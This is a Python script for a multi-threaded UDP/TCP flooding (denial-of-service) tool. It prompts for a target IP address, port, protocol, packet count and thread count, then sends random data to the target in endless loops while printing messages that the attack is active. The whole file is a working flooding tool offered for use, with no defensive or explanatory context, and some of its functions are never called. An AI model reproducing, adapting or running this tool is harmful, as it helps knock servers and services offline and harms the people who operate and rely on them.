import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("Enter any character")


test = input()
if test == "n":
	exit(0)
print("\033[H\033[J")
ip = str(input("Enter IP address: "))
print("\033[H\033[J")
port = int(input("Enter port: "))
print("\033[H\033[J")
choice = str(input("Type 'y' for UDP or anything else for TCP: "))
print("\033[H\033[J")
times = int(input("Number of packets: "))
print("\033[H\033[J")
threads = int(input("Number of threads: "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Attack on server is active!")
		except:
			s.close()
			print("Error")

def run2():
	data = random._urandom(16)
	i = "DertPolor"
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack on server is active")
		except:
			s.close()
			print("Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def whereuwere():
    print("Sorry, I can only use TCP or UDP")
    print("Type 1 for UDP or 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input("Do you want to exit? (y or n): "))
        if exitc == 'y':
            byebye()

    except KeyboardInterrupt:
        byebye()

    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
